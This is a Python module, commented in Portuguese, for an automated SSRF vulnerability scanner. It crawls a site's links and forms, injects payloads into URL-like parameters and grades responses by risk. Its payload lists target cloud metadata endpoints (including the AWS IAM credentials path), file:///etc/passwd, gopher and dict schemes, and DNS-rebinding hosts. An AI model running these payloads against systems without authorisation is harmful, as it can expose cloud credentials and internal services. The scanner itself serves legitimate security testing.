# -*- coding: utf-8 -*-
"""
SSRF (Server-Side Request Forgery) Scanner Module
Módulo para detecção de vulnerabilidades de Server-Side Request Forgery.
"""

import requests
import time
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn

from ..core.logger import get_logger
from ..utils.network import create_session


class SSRFScanner:
    """Scanner para detecção de vulnerabilidades de Server-Side Request Forgery (SSRF)."""

    def __init__(self, base_url, timeout=10):
        self.base_url = base_url
        self.timeout = timeout
        self.session = create_session()
        self.vulnerable_points = []
        
        # Payloads SSRF expandidos
        self.payloads = [
            # Localhost variations
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::]",
            "http://127.1",
            "http://127.0.1",
            "http://0177.0.0.1",  # Octal
            "http://0x7f.0x0.0x0.0x1",  # Hex
            "http://2130706433",  # Decimal
            
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            
            # Google Cloud metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata/computeMetadata/v1/",
            
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            
            # Private networks
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # File protocols
            "file:///etc/passwd",
            "file:///c:/windows/system32/drivers/etc/hosts",
            
            # Other protocols
            "ftp://127.0.0.1",
            "gopher://127.0.0.1",
            "dict://127.0.0.1:11211/",
            "ldap://127.0.0.1"
        ]

        # Payloads de DNS rebinding para bypass de proteção de rede
        self.dns_rebinding_payloads = [
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            "http://0x7f000001.xip.io",
            "http://1.0.0.127.xip.io",
            "http://spoofed.burpcollaborator.net",
            # Notação decimal alternativa
            "http://2130706433",  # 127.0.0.1 em decimal
            "http://017700000001",  # 127.0.0.1 em octal
            "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1 em hex
            # Encurtamento de URL que resolve para 127.0.0.1
            "http://localtest.me",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        ]

        # Headers extras para simular IMDSv2 (AWS Instance Metadata Service v2)
        self.imdsv2_headers = {
            "X-Forwarded-For": "169.254.169.254",
            "X-Real-IP": "169.254.169.254",
            "X-Client-IP": "169.254.169.254",
            "CF-Connecting-IP": "169.254.169.254",
        }

        self.logger = get_logger(__name__)
        self.console = Console()
        self._oast_client = None  # Inicializado sob demanda via set_oast_client()

    def set_oast_client(self, oast_client) -> None:
        """
        Configura um OASTClient para detecção de SSRF blind.

        Args:
            oast_client: instância de spectra.utils.oast.OASTClient
        """
        self._oast_client = oast_client
        if oast_client.is_available:
            oast_host = oast_client.generate_host(label="ssrf")
            oast_payload = f"http://{oast_host}"
            if oast_payload not in self.payloads:
                self.payloads.insert(0, oast_payload)
            # Adiciona variantes de protocolo OAST
            for proto in ("https", "ftp", "gopher"):
                variant = f"{proto}://{oast_host}"
                if variant not in self.payloads:
                    self.payloads.insert(1, variant)
            self.logger.info(f"OAST SSRF configurado: {oast_host}")

    def _scan_target(self, url, method, param, form_data=None):
        """Escaneia um parâmetro específico para SSRF"""
        for payload in self.payloads:
            try:
                test_data = {param: payload}
                # Mede o tempo do 1º request (evita double-request do timing check)
                start_time = time.time()
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=self.timeout, verify=False)
                else:
                    post_payload = form_data.copy() if form_data else {}
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=self.timeout, verify=False)
                response_time = time.time() - start_time
                
                # Detecção de SSRF através de indicadores na resposta
                ssrf_indicators = [
                    # Apache/Nginx indicators
                    "It works!",
                    "Apache",
                    "nginx",
                    "Welcome to nginx!",
                    "Apache2 Ubuntu Default Page",
                    
                    # AWS metadata indicators
                    "instance-id",
                    "ami-id",
                    "instance-type",
                    "public-hostname",
                    "security-groups",
                    "iam/security-credentials",
                    
                    # Google Cloud indicators
                    "computeMetadata",
                    "project/project-id",
                    "instance/service-accounts",
                    
                    # Azure indicators
                    "compute/vmId",
                    "compute/subscriptionId",
                    "instance/compute",
                    
                    # System files
                    "root:x:0:0:",
                    "daemon:x:1:1:",
                    "# localhost",
                    # Nota: "127.0.0.1" removido — é texto muito comum em HTML legítimo
                    # gerando falsos positivos sistemáticos
                    
                    # Network services
                    "SSH-2.0",
                    "220 ",  # FTP response
                    "HTTP/1.",
                    "Server:",
                    
                    # Error messages that indicate internal access
                    "Connection refused",
                    "No route to host",
                    "Network is unreachable",
                    "Internal Server Error",
                    "Bad Gateway",
                    "Service Temporarily Unavailable"
                ]
                
                response_text = response.text.lower()
                
                for indicator in ssrf_indicators:
                    if indicator.lower() in response_text:
                        # Determinar o nível de risco baseado no indicator
                        if any(aws in indicator.lower() for aws in ["instance-id", "ami-id", "security-credentials"]):
                            risk_level = "Crítico"
                            evidence_type = "AWS Metadata Access"
                        elif any(gcp in indicator.lower() for gcp in ["computemetadata", "project-id"]):
                            risk_level = "Crítico"
                            evidence_type = "GCP Metadata Access"
                        elif any(azure in indicator.lower() for azure in ["compute/vmid", "subscriptionid"]):
                            risk_level = "Crítico"
                            evidence_type = "Azure Metadata Access"
                        elif any(system in indicator.lower() for system in ["root:x:0:0:", "daemon:x:1:1:"]):
                            risk_level = "Alto"
                            evidence_type = "System File Access"
                        elif any(service in indicator.lower() for service in ["apache", "nginx", "it works!"]):
                            risk_level = "Alto"
                            evidence_type = "Internal Service Access"
                        else:
                            risk_level = "Médio"
                            evidence_type = "Network Access Indication"
                        
                        # Capturar evidência da resposta
                        evidence_start = response_text.find(indicator.lower())
                        evidence_excerpt = response.text[max(0, evidence_start-50):evidence_start+100]
                        
                        finding = {
                            "Risco": risk_level,
                            "Tipo": "Server-Side Request Forgery (SSRF)",
                            "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                            "Recomendação": f"Payload '{payload}' pode ter acessado recurso interno.",
                            "Payload": payload,
                            "Indicator": indicator,
                            "Evidence_Type": evidence_type,
                            "Response_Length": len(response.text),
                            "Status_Code": response.status_code,
                            "Evidence": evidence_excerpt.strip() if evidence_excerpt else "N/A",
                            "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
                            "Method": method.upper(),
                            "Content_Type": response.headers.get('content-type', 'N/A'),
                            "Server_Header": response.headers.get('server', 'N/A'),
                            "Response_Size": len(response.content),
                            "Confidence": "High" if risk_level in ["Crítico", "Alto"] else "Medium"
                        }
                        
                        if finding not in self.vulnerable_points:
                            self.vulnerable_points.append(finding)
                        return
                        
                # Detecção por timing anômalo usando o tempo do 1º request (sem double-request)
                # Se a resposta demorou mais que o normal mas menos que timeout
                if 3.0 < response_time < (self.timeout - 1):
                    timing_finding = {
                        "Risco": "Baixo",
                        "Tipo": "Possível SSRF (Timing-based)",
                        "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                        "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
                        "Payload": payload,
                        "Response_Time": round(response_time, 3),
                        "Response_Length": len(response.text),
                        "Status_Code": response.status_code,
                        "Detection_Method": "Timing-based",
                        "Evidence": f"Delay anômalo de {response_time:.2f}s detectado",
                        "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
                        "Method": method.upper(),
                        "Confidence": "Low"
                    }
                    
                    if timing_finding not in self.vulnerable_points:
                        self.vulnerable_points.append(timing_finding)
                    
            except requests.RequestException:
                continue

    def run_scan(self, return_findings=False):
        """Executa o scan principal de SSRF"""
        if not return_findings:
            self.console.print("-" * 80)
            self.console.print(f"[*] Executando scanner de SSRF em: [bold cyan]{self.base_url}[/bold cyan]")
            self.console.print(f"[*] Timeout: {self.timeout}s | Payloads: {len(self.payloads)}")
            self.console.print("-" * 80)
        
        start_time = time.time()
        
        try:
            with self.console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
                
        except requests.RequestException as e:
            if not return_findings: 
                self.console.print(f"[bold red][!] Não foi possível acessar a página inicial: {e}[/bold red]")
            return [] if return_findings else None

        # Parâmetros comuns para SSRF
        common_params = [
            'url', 'redirect', 'next', 'page', 'file', 'image_url', 'uri', 'link',
            'src', 'source', 'target', 'destination', 'callback', 'return_url',
            'continue', 'return_to', 'go', 'website', 'site', 'host', 'domain',
            'fetch', 'get', 'load', 'download', 'proxy', 'gateway', 'forward'
        ]
        
        tasks = []
        
        # Coleta links com parâmetros GET
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params):
                    tasks.append(('get', base, param, None))

        # Coleta formulários
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params):
                    tasks.append((method, action, param, data))
        
        # Testa parâmetros comuns mesmo se não encontrados
        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum parâmetro comum de SSRF encontrado. Testando parâmetros padrão...[/yellow]")
            for param in ['url', 'redirect', 'next', 'file', 'image_url']:
                tasks.append(('get', self.base_url, param, None))
        
        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum parâmetro para testar.[/yellow]")
            return [] if return_findings else None

        # Executa os testes
        with Progress(
            SpinnerColumn(), 
            TextColumn("[progress.description]{task.description}"), 
            BarColumn(), 
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
            TimeRemainingColumn(),
            console=self.console, 
            transient=return_findings
        ) as progress:
            task_id = progress.add_task("[green]Testando SSRF...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        scan_time = time.time() - start_time
        
        if not return_findings:
            self.console.print(f"\n[bold blue][*] Scan concluído em {scan_time:.2f} segundos[/bold blue]")
            self.console.print(f"[bold blue][*] Parâmetros testados: {len(tasks)}[/bold blue]")
            self.console.print(f"[bold blue][*] Vulnerabilidades encontradas: {len(self.vulnerable_points)}[/bold blue]")
            
        if return_findings: 
            return self.vulnerable_points
        
        self._present_findings()
        return self.vulnerable_points

    def _present_findings(self):
        """Apresenta os resultados encontrados"""
        self.console.print("-" * 80)
        if not self.vulnerable_points:
            self.console.print("[bold green][+] Nenhuma vulnerabilidade de SSRF foi encontrada.[/bold green]")
        else:
            # Resumo executivo
            critical_count = len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico'])
            high_count = len([f for f in self.vulnerable_points if f['Risco'] == 'Alto'])
            
            if critical_count > 0:
                self.console.print(f"[bold red]⚠️ ALERTA: {critical_count} vulnerabilidade(s) CRÍTICA(S) de SSRF encontrada(s)![/bold red]")
            if high_count > 0:
                self.console.print(f"[bold orange1]⚠️ ATENÇÃO: {high_count} vulnerabilidade(s) de ALTO RISCO encontrada(s)![/bold orange1]")
            
            self.console.print()
            
            # Tabela principal
            table = Table(title="[bold red]Vulnerabilidades de SSRF Detectadas[/bold red]")
            table.add_column("Risco", style="red", width=8)
            table.add_column("Parâmetro", style="cyan", width=15)
            table.add_column("Payload", style="yellow", width=25)
            table.add_column("Evidência", style="green", width=20)
            table.add_column("Status", style="blue", width=8)
            
            for f in self.vulnerable_points:
                payload = f.get('Payload', 'N/A')
                if len(payload) > 23:
                    payload = payload[:20] + "..."
                
                evidence_type = f.get('Evidence_Type', f.get('Detection_Method', 'N/A'))
                if len(evidence_type) > 18:
                    evidence_type = evidence_type[:15] + "..."
                
                param = f['Detalhe'].split("'")[1] if "'" in f['Detalhe'] else 'N/A'
                
                table.add_row(
                    f['Risco'],
                    param,
                    payload,
                    evidence_type,
                    str(f.get('Status_Code', 'N/A'))
                )
            
            self.console.print(table)
            self.console.print()
            
            # Recomendações específicas para SSRF
            self.console.print("\n[bold blue]Recomendações para Correção de SSRF:[/bold blue]")
            if critical_count > 0 or high_count > 0:
                self.console.print("[bold red]AÇÃO IMEDIATA NECESSÁRIA:[/bold red]")
                self.console.print("   1. Implementar whitelist de URLs/domínios permitidos")
                self.console.print("   2. Validar e sanitizar todas as entradas de URL")
                self.console.print("   3. Bloquear acesso a redes privadas (RFC 1918)")
                self.console.print("   4. Desabilitar redirecionamentos automáticos")
                self.console.print("   5. Implementar timeout curto para requisições externas")
                self.console.print()
            
            self.console.print("[bold yellow]MELHORIAS DE SEGURANÇA:[/bold yellow]")
            self.console.print("   • Usar proxy/gateway para requisições externas")
            self.console.print("   • Implementar DNS filtering para domínios maliciosos")
            self.console.print("   • Configurar firewall para bloquear acessos indevidos")
            self.console.print("   • Monitorar logs de rede para conexões suspeitas")
            self.console.print("   • Aplicar principle of least privilege")
            
        self.console.print("-" * 80)


def ssrf_scan(url, timeout=10, verbose=False):
    """
    Executa scan de SSRF em uma URL.
    
    Args:
        url (str): URL alvo para o scan
        timeout (int): Timeout das requisições
        verbose (bool): Saída detalhada
    
    Returns:
        list: Lista de vulnerabilidades encontradas
    """
    scanner = SSRFScanner(url, timeout=timeout)
    return scanner.run_scan()
